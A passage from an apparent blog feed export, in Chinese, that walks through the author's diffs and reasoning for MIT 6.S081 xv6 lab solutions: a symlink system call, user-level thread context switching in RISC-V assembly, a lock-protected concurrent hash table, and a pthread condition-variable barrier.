unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define T_DIR     1   // Directory</span><span class="token prefix unchanged"> </span><span class="token line">#define T_FILE    2   // File</span><span class="token prefix unchanged"> </span><span class="token line">#define T_DEVICE  3   // Device</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define T_SYMLINK 4   // Symbol link</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">struct stat &#123;</span><span class="token prefix unchanged"> </span><span class="token line">  int dev;     // File system's disk device</span></span>diff --git a/kernel/syscall.c b/kernel/syscall.cindex c1b3670..1697b62 100644<span class="token coord">--- a/kernel/syscall.c</span><span class="token coord">+++ b/kernel/syscall.c</span>@@ -104,6 +104,7 @@ extern uint64 sys_unlink(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_wait(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_write(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_symlink(void);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">static uint64 (*syscalls[])(void) = &#123;</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_fork]    sys_fork,</span></span>@@ -127,6 +128,7 @@ static uint64 (*syscalls[])(void) = &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">[SYS_link]    sys_link,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_mkdir]   sys_mkdir,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_close]   sys_close,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">[SYS_symlink] sys_symlink,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">void</span></span>diff --git a/kernel/syscall.h b/kernel/syscall.hindex bc5f356..0fbf6ed 100644<span class="token coord">--- a/kernel/syscall.h</span><span class="token coord">+++ b/kernel/syscall.h</span><span class="token coord">@@ -20,3 +20,4 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define SYS_link   19</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_mkdir  20</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_close  21</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define SYS_symlink 22</span></span>\ No newline at end of filediff --git a/kernel/sysfile.c b/kernel/sysfile.cindex 5dc453b..ae342c8 100644<span class="token coord">--- a/kernel/sysfile.c</span><span class="token coord">+++ b/kernel/sysfile.c</span><span class="token coord">@@ -15,6 +15,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#include "sleeplock.h"</span><span class="token prefix unchanged"> </span><span class="token line">#include "file.h"</span><span class="token prefix unchanged"> </span><span class="token line">#include "fcntl.h"</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#include "buf.h"</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// Fetch the nth word-sized system call argument as a file descriptor</span><span class="token prefix unchanged"> </span><span class="token line">// and return both the descriptor and the corresponding struct file.</span></span>@@ -316,6 +317,35 @@ sys_open(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  if (!(omode &amp; O_NOFOLLOW)) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    int depth = 10;</span><span class="token prefix inserted">+</span><span class="token line">    struct inode *next;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    while (depth > 0 &amp;&amp; ip->type == T_SYMLINK) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      if (readi(ip, 0, (uint64)path, 0, MAXPATH) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        iunlockput(ip);</span><span class="token prefix inserted">+</span><span class="token line">        end_op();</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">      &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">      if ((next = namei(path)) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        iunlockput(ip);</span><span class="token prefix inserted">+</span><span class="token line">        end_op();</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">      &#125;</span><span class="token prefix inserted">+</span><span class="token line">      iunlockput(ip);</span><span class="token prefix inserted">+</span><span class="token line">      ip = next;</span><span class="token prefix inserted">+</span><span class="token line">      --depth;</span><span class="token prefix inserted">+</span><span class="token line">      ilock(ip);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    if (depth &lt;= 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      iunlockput(ip);</span><span class="token prefix inserted">+</span><span class="token line">      end_op();</span><span class="token prefix inserted">+</span><span class="token line">      return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(ip->type == T_DEVICE &amp;&amp; (ip->major &lt; 0 || ip->major >= NDEV))&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    iunlockput(ip);</span><span class="token prefix unchanged"> </span><span class="token line">    end_op();</span></span>@@ -484,3 +514,28 @@ sys_pipe(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">  return 0;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_symlink(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">  int n1, n2;</span><span class="token prefix inserted">+</span><span class="token line">  char target[MAXPATH], path[MAXPATH];</span><span class="token prefix inserted">+</span><span class="token line">  struct inode *ip;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  if ((n1 = argstr(0, target, MAXPATH)) &lt; 0 || (n2 = argstr(1, path, MAXPATH)) &lt; 1) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // create symbol link in the path</span><span class="token prefix inserted">+</span><span class="token line">  begin_op();</span><span class="token prefix inserted">+</span><span class="token line">  if ((ip = create(path, T_SYMLINK, 0, 0)) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    end_op();</span><span class="token prefix inserted">+</span><span class="token line">    return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  if (writei(ip, 0, (uint64)target, 0, n1) &lt; n1) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    end_op();</span><span class="token prefix inserted">+</span><span class="token line">    return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  iunlockput(ip);</span><span class="token prefix inserted">+</span><span class="token line">  end_op();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/user/user.h b/user/user.hindex b71ecda..883ef48 100644<span class="token coord">--- a/user/user.h</span><span class="token coord">+++ b/user/user.h</span>@@ -23,6 +23,7 @@ int getpid(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">char* sbrk(int);</span><span class="token prefix unchanged"> </span><span class="token line">int sleep(int);</span><span class="token prefix unchanged"> </span><span class="token line">int uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int symlink(char *, char *);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// ulib.c</span><span class="token prefix unchanged"> </span><span class="token line">int stat(const char*, struct stat*);</span></span>diff --git a/user/usys.pl b/user/usys.plindex 01e426e..65a8d6b 100755<span class="token coord">--- a/user/usys.pl</span><span class="token coord">+++ b/user/usys.pl</span>@@ -36,3 +36,4 @@ entry("getpid");<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">entry("sbrk");</span><span class="token prefix unchanged"> </span><span class="token line">entry("sleep");</span><span class="token prefix unchanged"> </span><span class="token line">entry("uptime");</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">entry("symlink");</span></span>\ No newline at end of file</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Large-files&quot;&gt;&lt;a href=&quot;#Large-files&quot; class=&quot;headerlink&quot; title=&quot;Large files&quot;&gt;&lt;/a&gt;Large files&lt;/h1&gt;&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;head</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab Multithreading</title>
    <link href="http://lordaeronesz.github.io/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/"/>
    <id>http://lordaeronesz.github.io/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/</id>
    <published>2024-08-13T10:03:11.000Z</published>
    <updated>2024-08-14T08:16:25.833Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Uthread-switching-between-threads"><a href="#Uthread-switching-between-threads" class="headerlink" title="Uthread: switching between threads"></a>Uthread: switching between threads</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>xv6 已经实现了进程的切换机制，本实验要求参考进程的切换，实现一个用户态线程的切换。</p><p>要实现线程切换，必然涉及上下文，即寄存器的保存和恢复，那么需要保存哪些寄存器？实际上，只需要保存被调用者保存寄存器（callee-saved registers），而实现调用者保存寄存器（caller-saved registers）的保存与恢复的代码由编译器自动生成。关于调用者保存与被调用者保存寄存器有哪些可以参照下述 RISC-V 的 calling convention：</p><p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/call.png"></p><p>另外，根据 <code>user/uthread_switch.S</code> 的注释，<code>thread_switch</code> 最后通过 <code>ret</code> 指令将当前程序计数器的值切换为 ra 寄存器中存储的地址，实现进程的“切换”，因此 <code>struct thread</code> 中还需要保存每个线程对应程序的起始地址（即函数指针）。</p><p>在了解需要保存哪些寄存器之后以及如何进行线程切换之后，还有一个细节需要考虑，即栈指针寄存器（sp）的初始化。线程栈的存储位置为 <code>struct thread</code> 中的 <code>stack</code> 数组，那么 sp 应该指向 <code>stack</code> 的位置，但由于栈的地址从大到小增长，因此 <code>sp</code> 应该初始化为 <code>(uint64)t-&gt;stack + STACK_SIZE</code>.</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/user/uthread.c b/user/uthread.cindex 06349f5..74b7f20 100644<span class="token coord">--- a/user/uthread.c</span><span class="token coord">+++ b/user/uthread.c</span><span class="token coord">@@ -12,6 +12,20 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">struct thread &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  /* 0 */  uint64 ra;</span><span class="token prefix inserted">+</span><span class="token line">  /* 8 */  uint64 sp;</span><span class="token prefix inserted">+</span><span class="token line">  /* 16 */  uint64 s0;</span><span class="token prefix inserted">+</span><span class="token line">  /* 24 */ uint64 s1;</span><span class="token prefix inserted">+</span><span class="token line">  /* 32 */ uint64 s2;</span><span class="token prefix inserted">+</span><span class="token line">  /* 40 */ uint64 s3;</span><span class="token prefix inserted">+</span><span class="token line">  /* 48 */ uint64 s4;</span><span class="token prefix inserted">+</span><span class="token line">  /* 56 */ uint64 s5;</span><span class="token prefix inserted">+</span><span class="token line">  /* 64 */ uint64 s6;</span><span class="token prefix inserted">+</span><span class="token line">  /* 72 */ uint64 s7;</span><span class="token prefix inserted">+</span><span class="token line">  /* 80 */ uint64 s8;</span><span class="token prefix inserted">+</span><span class="token line">  /* 88 */ uint64 s9;</span><span class="token prefix inserted">+</span><span class="token line">  /* 96 */ uint64 s10;</span><span class="token prefix inserted">+</span><span class="token line">  /* 104 */ uint64 s11;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  char       stack[STACK_SIZE]; /* the thread's stack */</span><span class="token prefix unchanged"> </span><span class="token line">  int        state;             /* FREE, RUNNING, RUNNABLE */</span><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span>@@ -62,6 +76,7 @@ thread_schedule(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">     * Invoke thread_switch to switch from t to next_thread:</span><span class="token prefix unchanged"> </span><span class="token line">     * thread_switch(??, ??);</span><span class="token prefix unchanged"> </span><span class="token line">     */</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">thread_switch((uint64)t, (uint64)current_thread);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125; else</span><span class="token prefix unchanged"> </span><span class="token line">    next_thread = 0;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>@@ -76,6 +91,8 @@ thread_create(void (*func)())<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">  t->state = RUNNABLE;</span><span class="token prefix unchanged"> </span><span class="token line">  // YOUR CODE HERE</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  t->ra = (uint64)func;</span><span class="token prefix inserted">+</span><span class="token line">  t->sp = (uint64)t->stack + STACK_SIZE;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">void </span></span>diff --git a/user/uthread_switch.S b/user/uthread_switch.Sindex 5defb12..0eb0a2c 100644<span class="token coord">--- a/user/uthread_switch.S</span><span class="token coord">+++ b/user/uthread_switch.S</span><span class="token coord">@@ -7,5 +7,34 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">.globl thread_switch</span><span class="token prefix unchanged"> </span><span class="token line">thread_switch:</span></span>/* YOUR CODE HERE */<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">sd ra, 0(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd sp, 8(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s0, 16(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s1, 24(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s2, 32(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s3, 40(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s4, 48(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s5, 56(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s6, 64(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s7, 72(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s8, 80(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s9, 88(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s10, 96(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s11, 104(a0)</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">ld ra, 0(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld sp, 8(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s0, 16(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s1, 24(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s2, 32(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s3, 40(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s4, 48(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s5, 56(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s6, 64(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s7, 72(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s8, 80(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s9, 88(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s10, 96(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s11, 104(a1)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">ret    /* return to ra */</span></span></code></pre><h1 id="Using-threads"><a href="#Using-threads" class="headerlink" title="Using threads"></a>Using threads</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>后两个实验与 xv6 无关，而是练习使用 POSIX 线程库在实际的 Linux 平台进行并发编程。</p><p>本实验要求使用锁机制，实现一个支持并发的哈希表。首先需要确定的是：哪部分的操作会出现竞态（race condition）？根据观察不难得知 <code>put()</code> 操作可能存在下面这种情况：</p><blockquote><p>线程 1 和线程 2 本次 <code>put()</code> 映射到一个桶中（i 相同），都执行完 line 46 ~ 49 的循环之后，e 都为 0，随后先后执行 <code>insert()</code>，都创建一个新的 entry，并先后更新 <code>table[i]</code> 的值，导致先插入的键被覆盖。<br>像这样，在一次插入操作未完成的情况下，另一次插入也开始进行且映射到一个桶中，就会导致丢键（keys missing）的情况发生。</p></blockquote><p>首先最简单无脑的办法就是给整个 <code>put()</code> 函数加一把大锁：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// lock</span><span class="token keyword">for</span> <span class="token punctuation">(</span>e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>key <span class="token operator">==</span> key<span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// update the existing key.</span>    e<span class="token operator">-></span>value <span class="token operator">=</span> value<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// the new is new.</span>    <span class="token function">insert</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token operator">&amp;</span>table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// unlock</span></code></pre><p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/lock1.png"></p><p>可以看到，keys missing 的问题已经被解决，但是大锁带来的就是更低的性能，实际上根据上图可知，该实现在双核情况下的运行速度甚至慢于单核。</p><p>实际上，对 <code>table</code> 数组的遍历并不会导致竞态，因此将加锁的操作延迟到遍历结束后：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>key <span class="token operator">==</span> key<span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// lock</span><span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// update the existing key.</span>    e<span class="token operator">-></span>value <span class="token operator">=</span> value<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// the new is new.</span>    <span class="token function">insert</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token operator">&amp;</span>table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// unlock</span></code></pre><p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/lock2.png"></p><p>做了上述修改后，仍然没有出现 key missing 的情况，同时效率提升了一倍以上。</p><p>最后，更细化一些，只有当两个 <code>put()</code> 映射到同一个桶时才会发生竞态，因此可以为每个桶分别设置一把锁，以进一步提高并发性：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>key <span class="token operator">==</span> key<span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>locks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// lock</span><span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// update the existing key.</span>    e<span class="token operator">-></span>value <span class="token operator">=</span> value<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// the new is new.</span>    <span class="token function">insert</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token operator">&amp;</span>table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>locks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// unlock</span></code></pre><p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/lock3.png"></p><p>可见，效率又有进一步提升。</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/notxv6/ph.c b/notxv6/ph.cindex 82afe76..321e269 100644<span class="token coord">--- a/notxv6/ph.c</span><span class="token coord">+++ b/notxv6/ph.c</span>@@ -17,6 +17,7 @@ struct entry *table[NBUCKET];<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int keys[NKEYS];</span><span class="token prefix unchanged"> </span><span class="token line">int nthread = 1;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pthread_mutex_t locks[NBUCKET];</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">double</span><span class="token prefix unchanged"> </span><span class="token line">now()</span></span>@@ -47,6 +48,7 @@ void put(int key, int value)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    if (e->key == key)</span><span class="token prefix unchanged"> </span><span class="token line">      break;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  pthread_mutex_lock(&amp;locks[i]);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(e)&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    // update the existing key.</span><span class="token prefix unchanged"> </span><span class="token line">    e->value = value;</span></span>@@ -54,7 +56,7 @@ void put(int key, int value)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    // the new is new.</span><span class="token prefix unchanged"> </span><span class="token line">    insert(key, value, &amp;table[i], table[i]);</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  pthread_mutex_unlock(&amp;locks[i]);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">static struct entry*</span></span>@@ -118,6 +120,10 @@ main(int argc, char *argv[])<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    keys[i] = random();</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  for (int i = 0; i &lt; NBUCKET; ++i) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    pthread_mutex_init(&amp;locks[i], NULL);</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  //</span><span class="token prefix unchanged"> </span><span class="token line">  // first the puts</span><span class="token prefix unchanged"> </span><span class="token line">  //</span></span></code></pre><h1 id="Barrier"><a href="#Barrier" class="headerlink" title="Barrier"></a>Barrier</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>最后一个实验主要是熟悉 POSIX 线程库中条件变量（conditional variable）的使用，实现的思路比较简单：前 nthread - 1 个线程在条件变量上休眠，最后一个线程将休眠的所有进程进行唤醒。有关条件变量的用法可以参考 OSTEP：<a href="https://pages.cs.wisc.edu/~remzi/OSTEP/threads-cv.pdf">OSTEP: Condition Variables</a>.</p><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/notxv6/barrier.c b/notxv6/barrier.cindex 12793e8..e4fd03e 100644<span class="token coord">--- a/notxv6/barrier.c</span><span class="token coord">+++ b/notxv6/barrier.c</span>@@ -30,7 +30,18 @@ barrier()<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  // Block until all threads have called barrier() and</span><span class="token prefix unchanged"> </span><span class="token line">  // then increment bstate.round.</span><span class="token prefix unchanged"> </span><span class="token line">  //  </span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  pthread_mutex_lock(&amp;bstate.barrier_mutex);</span><span class="token prefix inserted">+</span><span class="token line">  ++bstate.nthread;</span><span class="token prefix inserted">+</span><span class="token line">  if (bstate.nthread == nthread) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    pthread_cond_broadcast(&amp;bstate.barrier_cond);</span><span class="token prefix inserted">+</span><span class="token line">++bstate.round;</span><span class="token prefix inserted">+</span><span class="token line">bstate.nthread = 0;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  else &#123;</span><span class="token prefix inserted">+</span><span class="token line">    pthread_cond_wait(&amp;bstate.barrier_cond, &amp;bstate.barrier_mutex);</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  